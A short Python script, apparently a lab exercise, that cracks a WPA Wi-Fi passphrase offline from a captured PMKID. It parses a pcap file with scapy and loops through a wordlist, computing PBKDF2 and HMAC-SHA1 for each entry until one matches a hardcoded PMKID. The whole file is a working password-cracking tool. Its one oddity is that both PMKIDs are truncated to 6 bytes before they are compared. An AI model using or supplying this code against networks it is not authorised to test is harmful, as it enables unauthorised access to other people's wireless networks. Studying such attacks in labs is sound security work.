#!/usr/bin/env python

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

packets = rdpcap("PMKID_handshake.pcap")

ssid        = packets[126].info.decode("utf-8")
APmac       = a2b_hex(packets[145].addr3.replace(':',''))
Clientmac   = a2b_hex(packets[145].addr1.replace(':',''))
pmkid       = a2b_hex("7fd0bc061552217e942d19c6686f1598")[:6]

# read wordlist line by line
with open('wordlist.txt') as fp:
    passPhrase = fp.readline()[:-1]
    found = False
    while passPhrase:
        pp_encoded = str.encode(passPhrase)
        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, str.encode(passPhrase), str.encode(ssid), 4096, 32)
        # compute the PMKID with the tested passphrase
        computed_pmkid = hmac.new(pmk,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1).digest()[:6]

        # compare the PMKIDs
        if b2a_hex(pmkid) == b2a_hex(computed_pmkid):
            found = True
            print("The key was found ! It is : ", passPhrase)

        passPhrase = fp.readline()[:-1]
    
    if not found:
        print("pass phrase not in the list.")
